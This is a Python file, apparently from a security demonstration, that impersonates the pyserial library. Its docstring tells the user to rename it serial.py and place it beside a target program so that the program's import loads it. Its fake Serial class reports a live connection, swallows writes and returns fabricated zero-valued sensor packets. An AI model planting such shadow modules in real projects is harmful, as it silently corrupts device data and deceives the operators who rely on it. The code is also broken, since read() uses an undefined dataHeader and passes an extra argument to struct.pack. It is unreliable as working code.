#-----------------------------------------------------------------------------
# Name:        serialHijacking.py
#
# Purpose:     This module is a simple example to demo python local file hijacking
#              attack for pyserial module.
#
# Version:     v_0.0.2
# Created:     2024/07/10
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
"""
    To demo the attack, change the file name to serial.py and copy the file to the 
    same folder of the target module which import the serial module with:
    import serial
"""
from struct import pack

class Serial(object):

    def __init__(self, port, bandwidth, bitNumber, parity, stopBit, timeout=1) -> None:
        self.connected = True
        pass

    def write(self, data):
        return True

    def read(self, data):
        dataByte = b''
        for _ in range(2):
            data = self.dataHeader + pack('i', int(0)) + pack('i', 34)
            for _ in range(35):
                data += pack('f', round(0), 2)
            dataByte += data
        #print('read: %s' %str(dataByte))
        return dataByte
    
    def close(self):
        return True